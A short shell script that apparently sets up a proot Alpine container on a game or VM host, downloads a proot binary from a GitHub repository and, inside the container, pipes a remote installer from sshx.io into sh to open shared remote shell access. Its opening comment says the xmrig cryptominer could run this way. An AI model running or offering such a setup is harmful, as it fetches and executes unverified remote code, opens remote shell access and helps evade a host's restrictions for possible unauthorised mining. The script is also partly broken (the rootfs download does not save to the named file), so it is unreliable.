# xmrig can be runnd i think bc it run in proot
echo Installing proot container
curl https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.3-x86_64.tar.gz -O rootfs.tgz
tar -xf rootfs.tgz
curl https://github.com/Afnanksalal/Ptero-vm/raw/refs/heads/main/proot --output proot
chmod +x proot
echo "apk add curl && curl -sSf https://sshx.io/get | sh && sshx" > setup.sh
./proot -r ./ ./setup.sh
